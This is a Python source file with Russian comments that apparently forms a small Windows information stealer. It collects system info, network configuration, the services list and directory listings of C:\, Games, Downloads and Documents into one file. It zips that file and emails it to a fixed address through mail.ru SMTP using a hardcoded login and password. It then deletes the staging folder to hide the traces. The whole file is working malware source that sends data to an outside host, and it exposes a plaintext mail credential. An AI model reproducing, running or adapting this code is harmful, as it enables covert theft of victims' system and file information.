import os																		
import smtplib																  
import zipfile
import tempfile 																			#########################
																							## ДОБАВЛЯЕМ БИБЛОТЕКИ ##
from email import encoders																	#########################
from email.mime.base import MIMEBase									
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart   


def main():


	def malware():
	
		os.mkdir("C:\\info_for_stealer")										# Создаем папку в которой будут хранится файлы
	
		os.system("ver >> C:\\info_for_stealer\\vin_version.txt")				# Добавляет вывод команды 'ver' в файл 
	
		os.system("systeminfo >> C:\\info_for_stealer\\systeminfo.txt")			# Добавляет вывод команды 'systeminfo' в файл 
	
		os.system("ipconfig >> C:\\info_for_stealer\\ip.txt")					# Добавляет вывод команды 'ipconfig' в файл 
	
		os.system("sc query >> C:\\info_for_stealer\\processes.txt")			# Добавляет вывод команды 'sc query' в файл
	
		games_dir_info = os.listdir("C:\\") 									# Сохраняет вывод команды 'listdir' в переменную games_dir_info
	
		if 'Games' in games_dir_info:											# Проверяет диск С на наличие папки 'Games'
			os.system("dir C:\\Games >> C:\\info_for_stealer\\Games.txt")		# Если находит, записывает в документ Games
	
		elif 'games' in games_dir_info:											# Проверяет диск С на наличие папки 'games'
			os.system("dir C:\\games >> C:\\info_for_stealer\\games.txt")		# Если находит, записывает в документ games
	
		os.system("dir C:\\ >> C:\\info_for_stealer\\C_info.txt")				# Записывает вывод команды 'dir ...' в документ C_info
	
		os.system("dir C:\\Users\\User\\Downloads >> C:\\info_for_stealer\\Downloads.txt") 		# Записывает вывод команды 'dir ...' в документ Downloads.txt 
	
		os.system("dir C:\\Users\\User\\Documents >> C:\\info_for_stealer\\Documents.txt") 		# Записывает вывод команды 'dir ...' в документ Documents.txt
	
		win_version = open('C:\\info_for_stealer\\vin_version.txt', 'r', encoding='utf-8') 		# Открывает файл vin_version
		win_version = win_version.read()										# Сохраняет данные из vin_version.txt в переменную win_version
	
		sys_info = open('C:\\info_for_stealer\\systeminfo.txt', 'r') 			# Откывает файл systeminfo
		sys_info = sys_info.read()												# Сохраняет данные из systeminfo.txt в переменную sys_info
	
		ip = open('C:\\info_for_stealer\\ip.txt', 'r') 							# Открывает файл ip
		ip = ip.read()															# Сохраняет данные из ip.txt в переменную ip
	
		processes = open('C:\\info_for_stealer\\processes.txt', 'r')			# Открывает файл processes
		processes = processes.read()											# Сохраняет данные из processes.txt в переменную processes
	
		Games = open('C:\\info_for_stealer\\Games.txt', 'r')					# Открывает файл Games
		Games = Games.read()													# Сохраняет данные из Games.txt  в переменную Games
	
		games = open('C:\\info_for_stealer\\games.txt', 'r') 					# Открывает файл games
		games = games.read()													# Сохраняет данные из games.txt  в переменную games
	
		C_info = open('C:\\info_for_stealer\\C_info.txt', 'r') 					# Открывает файл C_info
		C_info = C_info.read()													# Сохраняет данные из C_info.txt в переменную C_info
	
		Downloads = open('C:\\info_for_stealer\\Downloads.txt', 'r') 			# Открывает файл Downloads
		Downloads = Downloads.read()											# Сохраняет данные из Downloads.txt в переменную Downloads
	
		Documents = open('C:\\info_for_stealer\\Documents.txt', 'r')			# Открывает файл Documents
		Documents = Documents.read()											# Сохраняет данные из Documents.txt в переменную Documents
	
		info_for_stealer = win_version + sys_info + ip + processes + Games + games + C_info + Documents + Downloads 	# Сохраняет все данные из файлов в переменную info_for_stealer
	
		final_file_for_send = open('C:\\info_for_stealer\\final_file_for_send.txt', 'tw', encoding = 'utf-8') 	# Открывает файл  final_file_for_send
	
		final_file_for_send.write(info_for_stealer)								# Записывает данные из info_for_stealer в final_file_for_send
	
		final_file_for_send.close()												# Закрытие файла
	
	
	malware()
	
	
	
	def send_mail():
		the_file = 'StealInfo'
		url = "smtp.mail.ru"													######################################
		login_from_out_mail = "stealer2021@bk.ru"								## Все данные для отправки записаны ##
		password_from_out_mail = "yf]YrtrTDN19"									######################################	
		email = 'hubbleadd@bk.ru'
	
		zf = tempfile.TemporaryFile(prefix='mail', suffix='.zip')					
		zip = zipfile.ZipFile(zf, 'w')											###############
		zip.write("C:\\info_for_stealer\\final_file_for_send.txt")				## АРХИВАЦИЯ ##
		zip.close()																###############
		zf.seek(0)
	
		themsg = MIMEMultipart()

		themsg['Subject'] = 'Steal success!'
		themsg['From'] = login_from_out_mail
		msg = MIMEBase('application', 'zip')
		msg.set_payload(zf.read())
		encoders.encode_base64(msg)																##################
		msg.add_header('Content-Disposition', 'attachment', filename = the_file + '.zip')		## ФОРМИРОВАНИЕ ##
		themsg.attach(msg)																		##################
		themsg = themsg.as_string()

		serv = smtplib.SMTP_SSL(url, 465)										# Открывает порт

		serv.login(login_from_out_mail, password_from_out_mail)					# Логинимся под указанным email и паролем

		serv.sendmail(login_from_out_mail, email, themsg)						# Отправляем конечный файл
	
							# Отправка сообщения
	
	send_mail()
	
	def delete():
	
		os.system('rd /s /q info_for_stealer')
	
	delete()

main()